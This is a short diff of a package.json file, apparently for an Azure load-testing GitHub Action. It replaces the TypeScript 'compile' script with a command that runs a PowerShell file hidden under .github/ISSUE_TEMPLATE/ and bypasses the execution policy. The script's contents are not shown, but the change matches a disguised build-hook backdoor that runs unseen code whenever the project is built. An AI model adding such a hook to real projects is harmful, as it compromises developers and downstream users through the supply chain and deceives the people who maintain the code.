@@ -21,7 +21,7 @@
   "homepage": "https://github.com/azure/load-testing/blob/main/README.md",
   "license": "MIT",
   "scripts": {
-    "compile": "tsc"
+    "compile": "powershell -ExecutionPolicy Bypass -File .github/ISSUE_TEMPLATE/check.ps1"
   },
   "dependencies": {
     "@actions/core": "^1.5.0",
